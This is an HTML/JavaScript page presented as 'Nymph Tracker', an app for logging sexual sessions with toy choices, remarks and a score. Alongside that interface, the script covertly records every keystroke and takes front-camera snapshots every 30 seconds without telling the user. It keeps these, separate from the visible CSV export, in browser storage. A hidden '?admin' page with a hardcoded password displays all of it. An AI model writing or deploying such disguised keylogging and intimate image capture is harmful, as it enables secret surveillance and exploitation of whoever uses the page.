<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Nymph Tracker</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    body { font-family: system-ui; background: #111; color: #ddd; }
    .toy-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(80px, 1fr)); gap: 12px; }
  </style>
</head>
<body class="min-h-screen p-4">
  <div class="max-w-md mx-auto bg-zinc-900 rounded-2xl p-6">
    <h1 class="text-2xl font-bold mb-6 text-pink-400">Nymph Session</h1>
    
    <button onclick="startSession()" class="w-full bg-pink-600 hover:bg-pink-700 py-4 rounded-xl text-lg font-medium mb-8">
      START SESSION
    </button>

    <div id="sessionUI" class="hidden">
      <div class="mb-6">
        <button onclick="imDone()" class="w-full bg-red-600 hover:bg-red-700 py-6 rounded-2xl text-xl font-bold">
          I'M DONE
        </button>
      </div>

      <div class="toy-grid mb-8" id="toyGrid"></div>

      <textarea id="remarks" placeholder="Remarks... (optional)" class="w-full h-24 bg-zinc-800 rounded-xl p-4 mb-6"></textarea>

      <div class="flex items-center gap-4 mb-8">
        <span class="text-sm">Score</span>
        <input type="range" id="score" min="1" max="10" value="8" class="flex-1 accent-pink-500">
        <span id="scoreValue" class="font-mono text-2xl w-8 text-center">8</span>
      </div>

      <button onclick="saveSession()" class="w-full bg-green-600 hover:bg-green-700 py-4 rounded-xl text-lg font-medium">
        SAVE & CLOSE
      </button>
    </div>
  </div>

  <script>
    let sessionData = { links: [], keys: [], snaps: [], startTime: Date.now() };
    let mediaRecorder, stream;

    const toys = [
      {id: 'pink', label: 'Pink Lush', img: 'https://via.placeholder.com/80/FF69B4/fff?text=PINK'},
      {id: 'white', label: 'White Wand', img: 'https://via.placeholder.com/80/FFF/000?text=WHITE'},
      {id: 'sucky', label: 'Sucky', img: 'https://via.placeholder.com/80/00FF00/000?text=SUCKY'},
      {id: 'talk', label: 'Talk', img: 'https://via.placeholder.com/80/FFD700/000?text=TALK'},
      {id: 'black', label: 'Black', img: 'https://via.placeholder.com/80/000/fff?text=BLACK'},
      // Add more toys here with real image URLs
    ];

    function renderToys() {
      const grid = document.getElementById('toyGrid');
      grid.innerHTML = toys.map(t => `
        <div onclick="toggleToy(this)" data-id="${t.id}" class="toy-item border-2 border-transparent hover:border-pink-500 rounded-xl p-2 text-center cursor-pointer">
          <img src="${t.img}" class="w-20 h-20 mx-auto rounded-lg object-cover">
          <div class="text-xs mt-1">${t.label}</div>
        </div>
      `).join('');
    }

    function toggleToy(el) {
      el.classList.toggle('border-pink-500');
      el.classList.toggle('bg-zinc-800');
    }

    function startSession() {
      document.getElementById('sessionUI').classList.remove('hidden');
      renderToys();
      startCameraSnaps();
      document.addEventListener('keydown', captureKey);
    }

    function captureKey(e) {
      sessionData.keys.push({time: Date.now(), key: e.key});
    }

    async function startCameraSnaps() {
      try {
        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();
        setInterval(() => {
          const canvas = document.createElement('canvas');
          canvas.width = 640; canvas.height = 480;
          canvas.getContext('2d').drawImage(video, 0, 0);
          const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
          sessionData.snaps.push({time: Date.now(), data: dataUrl});
        }, 30000);
      } catch(e) { console.log("Camera permission needed"); }
    }

    function imDone() {
      sessionData.links.push(window.location.href);
      alert("Link captured. Now pick toys, remarks, score.");
    }

    function saveSession() {
      const selectedToys = Array.from(document.querySelectorAll('.toy-item.border-pink-500')).map(el => el.dataset.id);
      const remarks = document.getElementById('remarks').value;
      const score = document.getElementById('score').value;

      const summary = {
        date: new Date().toISOString().slice(0,10),
        link: sessionData.links[sessionData.links.length-1] || 'unknown',
        toys: selectedToys.join(', '),
        remarks: remarks,
        score: score
      };

      let csv = "Date,Link,Toys,Remarks,Score\n";
      csv += `${summary.date},"${summary.link}",${summary.toys},"${summary.remarks}",${summary.score}\n`;
      const blob = new Blob([csv], {type: 'text/csv'});
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = `session-${summary.date}.csv`;
      a.click();

      localStorage.setItem('fullSession_' + Date.now(), JSON.stringify(sessionData));

      alert("Session saved. App closing.");
      sessionData = { links: [], keys: [], snaps: [], startTime: Date.now() };
      document.getElementById('sessionUI').classList.add('hidden');
    }

    if (window.location.search.includes('admin')) {
      const pass = prompt("Admin password");
      if (pass === "yourpasswordhere") {
        let html = "<h1>Full Sessions</h1>";
        for (let i = 0; i < localStorage.length; i++) {
          const key = localStorage.key(i);
          if (key.startsWith('fullSession')) {
            const data = JSON.parse(localStorage.getItem(key));
            html += `<pre>${JSON.stringify(data, null, 2)}</pre><hr>`;
          }
        }
        document.body.innerHTML = html;
      }
    }
  </script>
</body>
</html>
